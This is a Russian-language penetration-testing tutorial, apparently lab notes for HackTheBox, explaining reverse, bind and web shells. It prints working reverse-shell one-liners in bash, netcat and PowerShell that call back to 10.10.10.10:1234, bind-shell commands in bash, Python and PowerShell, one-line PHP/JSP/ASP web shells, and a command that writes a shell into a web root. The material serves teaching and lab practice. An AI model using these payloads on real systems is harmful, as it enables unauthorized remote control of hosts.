# Types of Shells

После того, как мы скомпрометируем систему и воспользуемся уязвимостью для удаленного выполнения команд на скомпрометированных узлах, нам обычно нужен способ связи с системой, чтобы не использовать одну и ту же уязвимость для выполнения каждой команды. Чтобы перечислить систему или получить дополнительный контроль над ней или внутри ее сети, нам необходимо надежное соединение, которое дает нам прямой доступ к системной оболочке, то есть Bash или PowerShell, чтобы мы могли тщательно исследовать удаленную систему для нашего следующего шага.

Один из способов подключения к скомпрометированной системе - использование сетевых протоколов, таких как SSH для Linux или WinRM для Windows, что позволит нам удаленно войти в скомпрометированную систему. Однако, если мы не получим рабочий набор учетных данных для входа, мы не сможем использовать эти методы без предварительного выполнения команд в удаленной системе, чтобы получить доступ к этим службам в первую очередь.

Другой метод доступа к скомпрометированному хосту для управления и удаленного выполнения кода - через оболочки. Как обсуждалось ранее, существует три основных типа оболочек: обратная оболочка, связанная оболочка и веб-оболочка. У каждой из этих оболочек есть свой способ связи с нами для принятия и выполнения наших команд.

| Type of Shell | Method of Communication |
| :--- | :--- |
| `Reverse Shell` | Подключается обратно к нашей системе и дает нам контроль через обратное соединение. |
| `Bind Shell` | Ждет, когда мы подключимся к нему, и дает нам контроль, как только мы это сделаем. |
| `Web Shell` | Обменивается данными через веб-сервер, принимает наши команды через параметры HTTP, выполняет их и распечатывает результат. |

Давайте углубимся в каждую из вышеперечисленных оболочек и рассмотрим примеры каждой из них.

## Reverse Shell

Обратная оболочка - это наиболее распространенный тип оболочки, так как это самый быстрый и простой способ получить контроль над скомпрометированным хостом. Как только мы выявим уязвимость на удаленном хосте, которая позволяет удаленное выполнение кода, мы можем запустить прослушиватель netcat на нашей машине, который прослушивает определенный порт, скажем, порт 1234. Имея этот прослушиватель на месте, мы можем выполнить команду обратной оболочки, которая подключает оболочка удаленной системы, то есть Bash или PowerShell для нашего прослушивателя netcat, что дает нам обратное соединение через удаленную систему.

### **Netcat Listener**

Первый шаг - запустить прослушиватель netcat на выбранном нами порту:

```text
spike@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
```

Мы используем следующие флаги:

| Flag | Description |
| :--- | :--- |
| `-l` | Режим прослушивания, чтобы дождаться подключения к нам. |
| `-v` | Подробный режим, чтобы мы знали, когда мы получаем соединение. |
| `-n` | Отключите разрешение DNS и подключайтесь только с / к IP-адресам, чтобы ускорить соединение. |
| `-p 1234` | Номер порта, который прослушивает netcat, и ****на который должно быть отправлено обратное соединение. |

Теперь, когда у нас есть прослушиватель netcat, ожидающий подключения, мы можем выполнить команду обратной оболочки, которая подключается к нам.

### **Connect Back IP**

Однако сначала нам нужно найти IP-адрес нашей системы, чтобы отправить нам обратное соединение. Мы можем найти наш IP-адрес с помощью следующей команды:

```text
spike@htb[/htb]$ ip a

...SNIP...

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none
    inet 10.10.10.10/23 scope global tun0
...SNIP...
```

В нашем примере интересующий нас IP находится под tun0, это та же сеть HTB, к которой мы подключились через нашу VPN.

{% hint style="info" %}
Мы подключаемся к IP-адресу в tun0, потому что мы можем подключаться к ящикам HackTheBox только через VPN-соединение, так как у них нет подключения к Интернету, и поэтому они не могут подключиться к нам через Интернет с помощью eth0. В реальном пентесте вы можете быть напрямую подключены к той же сети или выполнять внешний тест на проникновение, поэтому вы можете подключиться через адаптер eth0 или аналогичный.
{% endhint %}

### **Reverse Shell Command**

Команда, которую мы выполняем, зависит от того, в какой операционной системе работает взломанный хост, например, Linux или Windows, и от того, к каким приложениям и командам мы можем получить доступ. На странице [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) есть полный список команд обратной оболочки, которые мы можем использовать, которые охватывают широкий спектр опций в зависимости от нашего скомпрометированного хоста.

Некоторые команды обратной оболочки более надежны, чем другие, и обычно их можно попытаться получить обратное соединение. Приведенные ниже команды являются надежными командами, которые мы можем использовать для получения обратного соединения для bash на скомпрометированных хостах Linux и Powershell на скомпрометированных хостах Windows:

```text
bash -c 'bash -i >& /dev/TCP/10.10.10.10/1234 0>&1'
```

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

```text
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Мы можем использовать имеющийся у нас эксплойт на удаленном хосте для выполнения одной из вышеперечисленных команд, то есть через эксплойт Python или модуль Metasploit, чтобы получить обратное соединение. Как только мы это сделаем, мы должны получить соединение в нашем слушателе netcat:

```text
spike@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Как мы видим, после того, как мы получили соединение с нашим слушателем netcat, мы смогли набрать нашу команду и напрямую получить ее результат прямо на нашей машине.

Обратная оболочка удобна, когда мы хотим получить быстрое и надежное соединение с нашим скомпрометированным хостом. Однако обратная оболочка может быть очень хрупкой. Как только команда обратной оболочки остановлена или если мы потеряем соединение по какой-либо причине, нам придется использовать начальный эксплойт для повторного выполнения команды обратной оболочки, чтобы восстановить наш доступ.

## Bind Shell

Другой тип оболочки - это Bind Shell. В отличие от Reverse Shell, которая подключается к нам, нам придется подключаться к ней через порт прослушивания целей.

Как только мы выполним команду Bind Shell, она начнет прослушивание порт на удаленном хосте и привяжет оболочку этого хоста, то есть Bash или PowerShell 'к этому порту. Мы должны подключиться к этому порту с помощью netcat, и мы получим управление через оболочку в этой системе.

### **Bind Shell Command**

Еще раз, мы можем использовать [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md), чтобы найти правильную команду для запуска нашей оболочки связывания.

{% hint style="info" %}
Мы запустим прослушивающее соединение на порту «1234» на удаленном хосте с IP «0.0.0.0», чтобы мы могли подключиться к нему из любого места.
{% endhint %}

Ниже приведены надежные команды, которые мы можем использовать для запуска оболочки привязки:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

```bash
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

### **Netcat Connection**

Как только мы выполним команду оболочки bind, у нас должна появиться оболочка, ожидающая нас на указанном порту. Теперь мы можем подключиться к нему.

Мы можем использовать netcat для подключения к этому порту и получить соединение с оболочкой:

```bash
spike@htb[/htb]$ nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Как мы видим, мы напрямую попадаем в сеанс bash и можем напрямую взаимодействовать с целевой системой. В отличие от обратной оболочки, если мы по какой-либо причине разорвем наше соединение с оболочкой привязки, мы сможем подключиться к ней обратно и немедленно получить другое соединение. Однако, если команда оболочки bind остановлена по какой-либо причине или если удаленный хост перезагружен, мы все равно потеряем доступ к удаленному хосту, и нам придется использовать его снова, чтобы получить доступ.

### **Upgrading TTY**

Как только мы подключимся к оболочке через Netcat, мы заметим, что можем вводить только команды или backspace, но мы не можем перемещать текстовый курсор влево или вправо для редактирования наших команд, а также мы не можем перемещаться вверх и вниз для доступа к истории команд. Для этого нам нужно будет обновить TTY. Это может быть достигнуто путем сопоставления нашего терминального TTY с удаленным TTY.

Для этого есть несколько способов. Для наших целей мы будем использовать метод python / stty. В нашей оболочке netcat мы будем использовать следующую команду, чтобы использовать python для обновления типа нашей оболочки до полного TTY:

```bash
spike@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
```

После того, как мы запустим эту команду, мы нажмем ctrl + z, чтобы запустить нашу оболочку в фоновом режиме, вернуться в наш локальный терминал и ввести следующую команду stty:

```bash
www-data@remotehost$ ^Z

spike@htb[/htb]$ stty raw -echo
spike@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```

Как только мы нажмем fg, он вернет нашу оболочку netcat на передний план. На этом этапе терминал покажет пустую строку. Мы можем снова нажать Enter, чтобы вернуться к нашей оболочке или сбросить ввод, и нажать Enter, чтобы вернуть его. На этом этапе у нас будет полностью работающая оболочка TTY с историей команд и всем остальным.

Мы можем заметить, что наша оболочка не покрывает весь терминал. Чтобы исправить это, нам нужно выяснить несколько переменных. Мы можем открыть другое окно терминала в нашей системе, развернуть окна или использовать любой размер, который нам нужен, а затем ввести следующие команды, чтобы получить наши переменные:

```bash
spike@htb[/htb]$ echo $TERM

xterm-256color
```

```bash
spike@htb[/htb]$ stty size

67 318
```

Первая команда показала нам переменную TERM, а вторая - значения для строк и столбцов соответственно. Теперь, когда у нас есть переменные, мы можем вернуться в оболочку netcat и использовать следующую команду для их исправления:

```bash
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```

Как только мы это сделаем, у нас должна быть оболочка netcat, которая использует все функции терминала, точно так же, как соединение SSH.

## Web Shell

Последний тип оболочки - это веб-оболочка. Веб-оболочка обычно представляет собой веб-скрипт, то есть PHP или ASPX, который принимает нашу команду через параметры HTTP-запроса, такие как параметры запроса GET или POST, выполняет нашу команду и печатает ее вывод обратно на веб-страницу.

### **Writing a Web Shell**

Прежде всего, нам нужно написать нашу веб-оболочку, которая будет принимать нашу команду через запрос GET, выполнять ее и печатать ее вывод обратно. Сценарий веб-оболочки обычно является однострочным, очень коротким и легко запоминающимся. Ниже приведены некоторые распространенные короткие сценарии веб-оболочки для распространенных веб-языков:

```php
<?PHP system($_GET['cmd']);?>
```

```javascript
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```aspnet
<% eval request("cmd") %>
```

### **Uploading a Web Shell**

Когда у нас есть веб-оболочка, нам нужно поместить сценарий веб-оболочки в веб-каталог удаленного хоста \(веб-каталог\), чтобы выполнить сценарий через веб-браузер. Это может быть из-за уязвимости в функции загрузки, которая позволит нам записать одну из наших оболочек в файл, то есть shell.php, и загрузить его, а затем получить доступ к нашему загруженному файлу для выполнения команд.

Однако, если у нас есть только удаленное выполнение команд с помощью эксплойта, мы можем записать нашу оболочку непосредственно в корневой каталог, чтобы получить к нему доступ через Интернет. Итак, первый шаг - определить, где находится веб-корневой каталог. Ниже перечислены веб-корневые каталоги по умолчанию для общих веб-серверов:

| Web Server | Default Webroot |
| :--- | :--- |
| `Apache` | /var/www/html/ |
| `Nginx` | /usr/local/nginx/html/ |
| `IIS` | c:\inetpub\wwwroot\ |
| `XAMPP` | C:\xampp\htdocs\ |

Мы можем проверить эти каталоги, чтобы увидеть, какой веб-корневой каталог используется, а затем использовать echo для записи нашей веб-оболочки. Например, если мы атакуем хост Linux, на котором запущен Apache, мы можем написать оболочку PHP с помощью следующей команды:

```bash
echo "<?PHP system(\$_GET['cmd']);?>" > /var/www/html/shell.php
```

### **Accessing Web Shell**

После того, как мы напишем нашу веб-оболочку, мы сможем получить к ней доступ через браузер или с помощью cURL. Мы можем посетить страницу shell.php на взломанном веб-сайте и использовать? Cmd = id для выполнения команды id:

```bash
http://SERVER_IP:PORT/shell.php?cmd=id
```

![](../../.gitbook/assets/image%20%286%29.png)

Другой вариант - использовать cURL:

```bash
spike@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Как мы видим, мы можем продолжать изменять команду, чтобы получить ее результат. Большим преимуществом веб-оболочки является то, что она обходит любые существующие ограничения брандмауэра, поскольку она не открывает новое соединение на порту, а запускается на веб-порту на 80 или 443, или на любом другом порту, который использует веб-приложение. Еще одно большое преимущество заключается в том, что если скомпрометированный хост перезагружен, веб-оболочка все еще будет на месте, и мы сможем получить к ней доступ и выполнить команду, не используя снова удаленный хост.

С другой стороны, веб-оболочка не так интерактивна, как обратная оболочка и оболочка привязки, поскольку мы должны постоянно запрашивать другой URL-адрес для выполнения наших команд. Тем не менее, в крайних случаях можно написать сценарий Python для автоматизации этого процесса и предоставить нам полуинтерактивную веб-оболочку прямо в нашем терминале.

